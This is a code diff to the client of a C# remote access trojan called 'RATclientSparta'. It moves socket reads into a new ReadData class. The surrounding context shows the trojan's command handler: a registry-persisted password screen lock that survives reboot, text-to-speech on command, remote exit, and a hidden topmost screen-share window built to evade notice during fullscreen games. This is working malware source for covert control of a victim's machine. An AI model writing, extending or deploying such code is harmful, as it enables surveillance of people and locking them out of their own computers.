@@ -46,19 +46,10 @@ namespace RATclientSparta.Server
             this.SocketConnection = ServerSocket;
             this.ServerConnected = true;
         }
-
-        private byte[] Read(int bytes)
-        {
-            byte[] buffer = new byte[bytes];
-            int bytesRead = 0;
-            while (bytesRead < bytes)
-                bytesRead += this.SocketConnection.Receive(buffer, bytesRead, bytes - bytesRead, SocketFlags.None);
-            return buffer;
-        }
-
         public void Receive()
         {
-            SendData Client = new SendData(this.SocketConnection, true);
+            SendData ClientSend = new SendData(this.SocketConnection, true);
+            ReadData ClientRead = new ReadData(this.SocketConnection);
 
             //Feature that locks the computer, Its using registry, So it will work even after computer restart.
             //If registry item called "ScreenLock" exist, then it will take its value(password) and open the Blocking GUI
@@ -70,7 +61,7 @@ namespace RATclientSparta.Server
                 try
                 {
                     //server must send 6 bytes - Therefore client know to expect for 6 bytes.
-                    byte[] tlv = Read(6);
+                    byte[] tlv = ClientRead.Read(6);
 
                     //index 0 = type
                     byte type = tlv[0];
@@ -80,7 +71,7 @@ namespace RATclientSparta.Server
                     int lengthRead = BitConverter.ToInt32(tlv, 1);
 
                     //reading from server according to the Int32 bit value (from index 1-6)
-                    byte[] message = Read(lengthRead);
+                    byte[] message = ClientRead.Read(lengthRead);
 
                     switch (type)
                     {
@@ -97,7 +88,7 @@ namespace RATclientSparta.Server
                         case 4: string a = Encoding.ASCII.GetString(message); SpeechSynthesizer synth = new SpeechSynthesizer(); synth.SetOutputToDefaultAudioDevice(); synth.Speak(a); break;
 
                         //exit program
-                        case 7: Client.Send(Encoding.ASCII.GetBytes("\0"), 0); Environment.Exit(0); break;
+                        case 7: ClientSend.Send(Encoding.ASCII.GetBytes("\0"), 0); Environment.Exit(0); break;
 
                         //screen Stream - Opening the hidden GUI of screen share. (small resolution TopMost GUI window so it will work even when playing on fullscreen games)
                         case 8: if (Application.OpenForms.OfType<ScreenShare>().Count() == 0) { new Thread(new ThreadStart(() => { ScreenShare ShareScreen = new ScreenShare(this, SocketConnection); ShareScreen.ShowDialog(); })).Start(); } break;
